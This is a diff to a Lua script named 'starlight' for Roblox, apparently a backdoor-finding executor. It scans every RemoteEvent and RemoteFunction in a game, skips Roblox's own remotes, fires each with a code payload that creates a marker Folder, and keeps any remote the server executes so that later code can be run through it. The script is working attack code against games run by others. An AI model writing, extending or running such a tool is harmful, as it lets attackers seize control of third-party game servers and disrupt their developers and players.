@@ -1,5 +1,5 @@
 -- starlight 💫
--- 0.2.5
+-- 0.2.52
 
 
 
@@ -2361,176 +2361,172 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	local player = game.Players.LocalPlayer
 	local mouse = player:GetMouse()
 	local userInputService = game:GetService("UserInputService")
-	local runService = game:GetService("RunService")
 	local tweenService = game:GetService("TweenService")
 	local HttpService = game:GetService("HttpService")
 	local RunService = game:GetService("RunService")
 	
-	
-	local EXCLUDED_REMOTES = {
-		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
-		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
-		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
-		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
-		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
-		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
-		GetServerVersion = true, GetClientId = true, GetInventory = true,
-		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
-		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
-		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
-		ReportAbuse = true
-	}
-	
-	local SAFE_LOCATIONS = {
-		["CoreGui"] = true,
-		["ServerStorage"] = true,
-		["ReplicatedFirst"] = true,
-		["ServerScriptService"] = true
-	}
-	
-	local foundExploit = false
-	local FinishedFound = false
-	local mode = 3
-	local bg = 1
-	local remoteEvent, remoteFunction
-	local scanTime = 0
-	
-	local function isLikelyBackdoorRemote(remote)
-		local name = remote.Name
-		local parent = remote.Parent
-	
-	
-		if SAFE_LOCATIONS[parent.ClassName] then
-			return false
+	local rs = game:GetService("ReplicatedStorage")
+
+local EXCLUDED_REMOTES = {
+	UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
+	OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
+	NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
+	SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
+	PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
+	PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
+	GetServerVersion = true, GetClientId = true, GetInventory = true,
+	GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
+	UpdatePlayerBlockList = true, SetAvatarBlockList = true,
+	SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
+	ReportAbuse = true
+}
+
+local SAFE_LOCATIONS = {
+	["CoreGui"] = true,
+	["ServerStorage"] = true,
+	["ReplicatedFirst"] = true,
+	["ServerScriptService"] = true
+}
+
+local foundExploit = false
+local remoteEvent, remoteFunction
+
+local function isLikelyBackdoorRemote(remote)
+	if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
+	if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
+	if EXCLUDED_REMOTES[remote.Name] then return false end
+	return true
+end
+
+local function testRemote(remote, isFunction, timeout)
+	if foundExploit then return false end
+	if not isLikelyBackdoorRemote(remote) then return false end
+
+	local modelName = "starlight_"..tostring(os.clock()):gsub("%.", "")
+	local foundEvent = false
+
+	local connection = rs.DescendantAdded:Connect(function(inst)
+		if inst.Name == modelName then
+			foundEvent = true
 		end
-		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
-			print('cancelled remote: '..remote:GetFullName())
-			return false
-		end 
-		if EXCLUDED_REMOTES[name] then
-			return false
-		end
-	
-	
-		return true
+	end)
+
+	local function cleanup()
+		connection:Disconnect()
+		local f = rs:FindFirstChild(modelName)
+		if f then f:Destroy() end
 	end
-	
-	local function testRemote(remote, isFunction)
-		if foundExploit then return false end
-		if not isLikelyBackdoorRemote(remote) then return false end
-	
-		local modelName = "starlight_"..tostring(os.clock()):gsub("%.", "")
-		local rs = game:GetService("ReplicatedStorage")
-		local foundEvent = false
-	
-		local connection = rs.DescendantAdded:Connect(function(inst)
-			if inst.Name == modelName then
-				foundEvent = true
-			end
-		end)
-	
-		local function cleanup()
-			connection:Disconnect()
-			local f = rs:FindFirstChild(modelName)
-			if f then f:Destroy() end
-		end
-	
-		local success = pcall(function()
-			local payload = [[
-				local m=Instance.new("Folder")
-				m.Name="]]..modelName..[["
-				m.Parent=game:GetService("ReplicatedStorage")
-			]]
+
+	local payload = [[
+		local m=Instance.new("Folder")
+		m.Name="]]..modelName..[[" 
+		m.Parent=game:GetService("ReplicatedStorage")
+	]]
+
+	local finished = false
+
+	task.spawn(function()
+		pcall(function()
 			if isFunction then
 				remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
 			else
 				remote:FireServer(payload)
 			end
 		end)
-	
-		-- wait max 0.5s but break earlier if found
-		local timeout = 1
-		local start = os.clock()
-		while os.clock() - start < timeout do
-			if foundEvent or rs:FindFirstChild(modelName) then
-				foundEvent = true
-				break
-			end
-			task.wait(0.01)
+		finished = true
+	end)
+
+	-- wait max timeout seconds
+	local start = os.clock()
+	while os.clock() - start < timeout do
+		if foundEvent or rs:FindFirstChild(modelName) then
+			foundEvent = true
+			break
 		end
-	
-		cleanup()
-	
-		if foundEvent and not foundExploit then
-			foundExploit = true
-			if isFunction then
-				remoteFunction = remote
-			else
-				remoteEvent = remote
-			end
-			return true
+		if finished then
+			break
 		end
-	
-		return false
+		task.wait()
 	end
-	
-	
-	
-	local function findRemote()
-		local trueStart = os.clock()
-		foundExploit = false
-		remoteEvent = nil
-		remoteFunction = nil
-	
-		local remotes = {}
-		for _, remote in ipairs(game:GetDescendants()) do
-			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-				table.insert(remotes, remote)
-			end
+
+	cleanup()
+
+	if foundEvent and not foundExploit then
+		foundExploit = true
+		if isFunction then
+			remoteFunction = remote
+		else
+			remoteEvent = remote
 		end
-	
-		print(string.format("💫 starlight: 🔍 scanning %d remotes", #remotes))
-	
-		local MAX_CONCURRENT = 64 -- go wild 😈
-		local activeTasks = 0
-		local taskDone = Instance.new("BindableEvent")
-	
-		for i = 1, #remotes do
-			if foundExploit then break end
-	
-			while activeTasks >= MAX_CONCURRENT do
-				taskDone.Event:Wait()
-			end
-	
-			activeTasks += 1
-			task.spawn(function()
-				local ok, result = pcall(function()
-					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
-				end)
-	
-				if ok and result then
-					print("💫 starlight: backdoor found:", remotes[i]:GetFullName())
-				end
-	
-				activeTasks -= 1
-				taskDone:Fire()
-			end)
+		return true
+	end
+
+	return false
+end
+
+
+local function fastFindRemote(timeout)
+	foundExploit = false
+	remoteEvent = nil
+	remoteFunction = nil
+
+	local remotes = {}
+	for _, remote in ipairs(game:GetDescendants()) do
+		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+			table.insert(remotes, remote)
 		end
-	
-		while activeTasks > 0 and not foundExploit do
+	end
+
+	print(string.format("💫 starlight: 🔍 scanning %d remotes (%.1fs timeout)", #remotes, timeout))
+
+	local MAX_CONCURRENT = 128
+	local activeTasks = 0
+	local taskDone = Instance.new("BindableEvent")
+
+	for i = 1, #remotes do
+		if foundExploit then break end
+
+		while activeTasks >= MAX_CONCURRENT do
 			taskDone.Event:Wait()
 		end
-	
-		scanTime = os.clock() - trueStart
-		FinishedFound = true
-	
-		if not foundExploit then
-			print("💫 starlight: no backdoor found")
-		end
-	
-		print(string.format("💫 starlight: scan completed in %.3f seconds", scanTime))
+
+		activeTasks += 1
+		task.spawn(function()
+			local ok, result = pcall(function()
+				return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout)
+			end)
+
+			if ok and result then
+				print("💫 starlight: backdoor found:", remotes[i]:GetFullName())
+			end
+
+			activeTasks -= 1
+			taskDone:Fire()
+		end)
 	end
-	
+
+	while activeTasks > 0 and not foundExploit do
+		taskDone.Event:Wait()
+	end
+
+	if not foundExploit then
+		print("💫 starlight: no backdoor found")
+	end
+
+	return foundExploit
+end
+
+local function findRemote()
+local trueStart = os.clock()
+	local tStart = os.clock()
+
+	fastFindRemote(1)
+
+    scanTime = os.clock() - trueStart -- ✅ put this back
+    FinishedFound = true -- ✅ mark finished when all scans done
+	print(string.format("💫 starlight: scan completed in %.3f seconds", os.clock() - tStart))
+end
+
 	
 	local function fireRemoteEvent(code)
 		if remoteEvent then
